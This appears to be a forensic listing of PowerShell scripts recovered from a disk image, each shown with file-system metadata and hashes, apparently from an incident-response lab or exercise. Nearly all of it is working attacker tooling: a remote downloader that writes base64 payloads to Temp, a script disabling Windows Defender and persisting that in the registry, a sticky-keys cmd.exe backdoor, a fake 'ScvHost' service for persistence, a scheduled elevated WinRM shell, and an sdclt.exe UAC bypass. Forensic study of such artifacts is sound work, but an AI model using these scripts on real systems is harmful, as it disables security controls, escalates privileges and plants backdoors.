## `WriteRemoteEncoded.ps1`
```powershell
Param(
    [Parameter(Mandatory=$true,
    ValueFromPipeLine=$false)]
    [String[]]
    $Uri,

    [Parameter(Mandatory=$true,
    ValueFromPipeLine=$false)]
    [String[]]
    $FileName
)

Write-Host $Uri

$path = "$env:TEMP\$FileName"
if (Test-Path -Path $path) {
    Write-Host "[*] File already exist at $ScriptPath"
    return -1
}

$data = [System.Convert]::FromBase64String((Invoke-WebRequest -Uri "$Uri" -UseBasicParsing).content)
[System.IO.File]::WriteAllBytes($path, $data)
```
```text
### Metadata
Name: /img_disk.raw/vol_vol7/Users/Alan/AppData/Local/Temp/WriteRemoteEncoded.ps1
Type: File System
MIME Type: text/plain
Size: 485
File Name Allocation: Allocated
Metadata Allocation: Allocated
Modified: 2019-08-17 05:45:24 UTC
Accessed: 2019-08-17 05:48:39 UTC
Created: 2019-08-17 05:45:24 UTC
Changed: 2019-08-17 05:45:24 UTC
MD5: 3f395e2c81bfbe6be00cb8935959992d
SHA-256:
87cf6ffd1403914f6f8969c6f6fd730684c91670501f51b54200aabdb34ccf49
Hash Lookup Results: UNKNOWN
Internal ID: 14926
```
## `WinRM_Elevated_Shell.ps1`
```powershell
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <URI>\WinRM_Elevated_Shell</URI>
  </RegistrationInfo>
  <Triggers />
  <Principals>
    <Principal id="Author">
      <RunLevel>HighestAvailable</RunLevel>
      <UserId>alan</UserId>
      <LogonType>Password</LogonType>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT24H</ExecutionTimeLimit>
    <Priority>4</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>cmd</Command>
      <Arguments>/c powershell.exe -executionpolicy bypass -NoProfile -File c:/windows/temp/winrm-elevated-shell-f5d625ea-66b1-4480-bf3c-f84423135094.ps1 &gt; C:\Users\Alan\AppData\Local\Temp\tmp95BE.tmp 2&gt;C:\Users\Alan\AppData\Local\Temp\tmp95BF.tmp</Arguments>
    </Exec>
  </Actions>
</Task>
```
```text
Metadata
Name: /img_disk.raw/vol_vol7/Windows/System32/Tasks/WinRM_Elevated_Shell
Type: File System
MIME Type: application/xml
Size: 3152
File Name Allocation: Allocated
Metadata Allocation: Allocated
Modified: 2019-08-17 05:36:40 UTC
Accessed: 2019-08-17 05:36:40 UTC
Created: 2019-08-17 05:36:28 UTC
Changed: 2019-08-17 05:36:40 UTC
MD5: b45f19d51fccd51316bbbc3a82c0d270
SHA-256: 90857bb771e15c4f9eeb8dbea730d753650a859fce105f0239410876a56029a0
Hash Lookup Results: UNKNOWN
Internal ID: 188084
```

## `vagrant-shell.ps1`
```powershell
# Disable Windows Defender features in real time
Set-MpPreference -MAPSReporting 0
Set-MpPreference -SubmitSamplesConsent 2
Set-MpPreference -DisableRealtimeMonitoring $True
Set-MpPreference -DisableBehaviorMonitoring $True
Set-MpPreference -DisableIntrusionPreventionSystem $True
Set-MpPreference -DisableIOAVProtection $True
Set-MpPreference -DisableRealtimeMonitoring $True
Set-MpPreference -DisableScriptScanning $True
Set-MpPreference -DisableArchiveScanning $True
Set-MpPreference -DisableCatchupFullScan $True
Set-MpPreference -DisableCatchupQuickScan $True
Set-MpPreference -DisableEmailScanning $True
Set-MpPreference -DisableRemovableDriveScanning $True
Set-MpPreference -DisableRestorePoint $True
Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $True
Set-MpPreference -DisableScanningNetworkFiles $True
Set-MpPreference -DisableBlockAtFirstSeen $True


# Persist Windows Defender features settings in registry
$path = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
if (!(Test-Path -Path $path)) {
    New-Item -Path $path -Force
}
New-ItemProperty -Path $path -Name "DisableAntiSpyware" -PropertyType DWord -Value 1 -Force

$path = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet"
if (!(Test-Path -Path $path)) {
    New-Item -Path $path -Force
}

New-ItemProperty -Path $path -Name "SubmitSamplesConsent" -PropertyType DWord -Value 2 -Force

$path = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
if (!(Test-Path -Path $path)) {
    New-Item -Path $path -Force
}

New-ItemProperty -Path $path -Name "DisableRealtimeMonitoring" -PropertyType DWord -Value 1 -Force
New-ItemProperty -Path $path -Name "DisableBehaviorMonitoring" -PropertyType DWord -Value 1 -Force
New-ItemProperty -Path $path -Name "DisableOnAccessProtection" -PropertyType DWord -Value 1 -Force
New-ItemProperty -Path $path -Name "DisableScanOnRealtimeEnable" -PropertyType DWord -Value 1 -Force
```
```text
Metadata
Name: /img_disk.raw/vol_vol7/tmp/vagrant-shell.ps1
Type: File System
MIME Type: text/plain
Size: 1933
File Name Allocation: Allocated
Metadata Allocation: Allocated
Modified: 2019-08-17 05:36:39 UTC
Accessed: 2019-08-17 05:36:40 UTC
Created: 2019-08-17 05:36:26 UTC
Changed: 2019-08-17 05:36:39 UTC
MD5: e98a5bf691b4b2540f5a429d41a95329
SHA-256: f2624fdf03f7526e78a14f40e9e50b62a36d1f143b065dd0c07bf2f0447a73a6
Hash Lookup Results: UNKNOWN
Internal ID: 46062
```
## `Sticky.ps1`
```powershell
$path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
if (!(Test-Path -Path $path)) {
    New-Item -Path $path -Force
}

New-ItemProperty -Path $path -Name "Debugger" -PropertyType String -Value "C:\windows\system32\cmd.exe" -Force
### Metadata
Name: /img_disk.raw/vol_vol7/Users/Alan/AppData/Local/Temp/Sticky.ps1
Type: File System
MIME Type: text/plain
Size: 277
File Name Allocation: Allocated
Metadata Allocation: Allocated
Modified: 2019-08-17 05:47:41 UTC
Accessed: 2019-08-17 05:49:01 UTC
Created: 2019-08-17 05:47:41 UTC
Changed: 2019-08-17 05:47:41 UTC
MD5: 345a02f5cfbc2760da886c49c2a47a70
SHA-256: 1c43b954af727b638eb385b477d4fbcdd021e212c8c77d5cc26e0063031e41f0
Hash Lookup Results: UNKNOWN
Internal ID: 14932


## `Service.ps1`
```powershell
$path = "$env:TEMP\scvhost.exe"

if (Test-Path -Path $path) {
    New-Service -Name "ScvHost" -BinaryPathName $path -DisplayName "ScvHost" -Description "Shared Service Host" -StartupType Automatic
    Start-Service -Name "ScvHost"
}
```
### Metadata
Name: /img_disk.raw/vol_vol7/Users/Alan/AppData/Local/Temp/Service.ps1
Type: File System
MIME Type: text/plain
Size: 232
File Name Allocation: Allocated
Metadata Allocation: Allocated
Modified: 2019-08-17 05:48:07 UTC
Accessed: 2019-08-17 05:49:18 UTC
Created: 2019-08-17 05:48:07 UTC
Changed: 2019-08-17 05:48:07 UTC
MD5: df94b76332ad29f2a93c7c7a5a1c7fcd
SHA-256: 242f3af26875dc83622403c774e66c1072a83942fe31e41ce36a8c1bc63cbe3d
Hash Lookup Results: UNKNOWN
Internal ID: 14931

## `ElevateExecute.ps1`
```powershell
Param(
    [Parameter(Mandatory=$true,
    ValueFromPipeLine=$false)]
    [String[]]
    $ScriptPath
)

if (!(Test-Path -Path $ScriptPath)) {
    Write-Host "[*] File does not exist at $ScriptPath"
    return -1
}

$path = "HKCU:\Software\Classes\Folder\shell\open\command"
if (!(Test-Path -Path $path)) {
    New-Item -Path $path -Force
}

New-ItemProperty -Path $path -Name "(Default)" -PropertyType String -Value "PowerShell.exe -File $ScriptPath" -Force
New-ItemProperty -Path $path -Name "DelegateExecute" -Force

Start-Process -FilePath "$env:windir\system32\sdclt.exe"

Start-Sleep -Seconds 3

Clear-ItemProperty -Path $path -Name "(Default)"
Remove-ItemProperty -Path $path -Name "DelegateExecute"
```
### Metadata
Name:
/img_disk.raw/vol_vol7/Users/Alan/AppData/Local/Temp/ElevateExecute.ps1
Type: File System
MIME Type: text/plain
Size: 705
File Name Allocation: Allocated
Metadata Allocation: Allocated
Modified: 2019-08-17 05:46:56 UTC
Accessed: 2019-08-17 05:49:15 UTC
Created: 2019-08-17 05:46:56 UTC
Changed: 2019-08-17 05:46:56 UTC
MD5: 9b70c59d1eff15b6ade571c9f445deb0
SHA-256: ff749aafa6da72d5a7dfb244f6e89b6b141f861d7af70f3aba986b3cf26ce1c6
Hash Lookup Results: UNKNOWN
Internal ID: 14927

